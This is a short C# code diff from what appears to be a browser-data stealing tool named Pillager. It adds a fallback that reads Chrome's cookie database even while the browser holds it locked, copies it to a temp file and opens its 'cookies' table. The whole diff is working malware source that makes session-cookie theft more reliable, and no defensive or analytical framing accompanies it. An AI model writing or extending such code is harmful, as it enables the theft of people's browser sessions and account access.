@@ -163,7 +163,18 @@ namespace Pillager.Browsers
             try
             {
                 string cookie_tempFile = Path.GetTempFileName();
-                File.Copy(chrome_cookie_path, cookie_tempFile, true);
+                try
+                {
+                    File.Copy(chrome_cookie_path, cookie_tempFile, true);
+                }
+                catch 
+                {
+                    byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
+                    if (ckfile!=null)
+                    {
+                        File.WriteAllBytes(cookie_tempFile, ckfile);
+                    }
+                }
                 SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                 if (!handler.ReadTable("cookies"))
                     return null;
